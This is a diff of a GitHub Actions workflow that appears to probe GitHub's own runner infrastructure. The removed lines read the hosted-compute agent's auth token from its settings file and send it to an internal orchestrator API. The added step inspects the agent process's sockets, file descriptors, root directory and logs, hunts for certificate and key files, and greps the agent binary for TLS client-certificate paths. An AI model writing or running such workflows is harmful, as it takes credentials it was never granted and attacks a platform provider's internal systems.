@@ -1,35 +1,44 @@
-name: HCA Client v2
+name: HCA Deep Dive
 on:
   push:
     branches: [master]
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 10
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-      - name: Fix and retry
+      - name: Deep HCA investigation
+        continue-on-error: true
         run: |
-          # Test with correct base URL (try without /v1)
-          TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
+          HCA_PID=$(pgrep -f hosted-compute-agent)
+          echo "=== HCA PID: $HCA_PID ==="
           
-          echo "=== Without /v1 ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
-            curl -sk --http2 --connect-timeout 5 \
-              -H 'Authorization: Bearer $TOK' \
-              -H 'Content-Type: application/json' \
-              -d '{\"planId\":\"test\"}' \
-              'https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'
-          " 2>&1
+          echo "=== HCA open sockets ==="
+          ss -tnp | grep $HCA_PID
           
-          echo ""
-          echo "=== With /v1/ prefix ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
-            curl -sk --http2 --connect-timeout 5 \
-              -H 'Authorization: Bearer $TOK' \
-              -H 'Content-Type: application/json' \
-              -H 'Accept: application/json' \
-              -d '{}' \
-              'https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'
-          " 2>&1
+          echo "=== HCA fd/ ==="
+          ls -la /proc/$HCA_PID/fd/
+          
+          echo "=== HCA root dir ==="
+          ls -la /proc/$HCA_PID/root/
+          
+          echo "=== Search for .cert .pem .crt ==="
+          find /home/runner /opt /etc -name "*.cert" -o -name "*.pem" -o -name "*.crt" 2>/dev/null | grep -v "snap\|Homebrew\|linuxbrew\|ruby\|go/pkg\|python3\|nvm" | head -20
+          
+          echo "=== HCA log ==="
+          cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | tail -30
+          
+          echo "=== Check for strace ==="
+          which strace 2>/dev/null || echo "no strace"
+          
+          echo "=== Check HCA binary strings for TLS ==="
+          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -E "cert_file|key_file|tls_cert|tls_key|client_cert|\.pem|\.crt|tls\.Client" | head -10
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: hca-deep
+          path: /home/runner/work/npm-install/npm-install/dist/
